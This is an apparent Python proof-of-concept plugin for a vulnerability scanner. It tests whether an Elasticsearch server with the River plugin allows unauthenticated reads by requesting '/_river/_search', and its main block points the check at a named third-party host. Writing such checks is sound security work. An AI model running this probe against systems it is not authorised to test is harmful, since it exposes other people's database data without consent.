#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  : elasticsearch river 未授权访问
Author    : a
mail      :a@lcx.cc
Referer   :http://zone.wooyun.org/content/20297
elasticsearch在安装了river之后可以同步多种数据库数据
"""
from ..miniCurl import Curl
from ..t  import T

class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg=ip
        curl=Curl()
        result = {}
        result['result']=False

        payload = '/_river/_search'
        url = 'http://' +arg + ':'+port+  payload
        code, head, res, errcode, _ = curl.curl('"%s"' % url)
        if code == 200 and '_river' in res and 'type' in res:
            output(url,result,'hole')
           
    

        del curl
        return result


def output(url,result,label):
    info = url + '  elasticsearch  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='river bypass Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/elasticsearch/ip_a8171b91f934bb46294aa01a950f56c5.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/ip/ip_a8171b91f934bb46294aa01a950f56c5.py
#/root/github/poccreate/codesrc/exp-749.py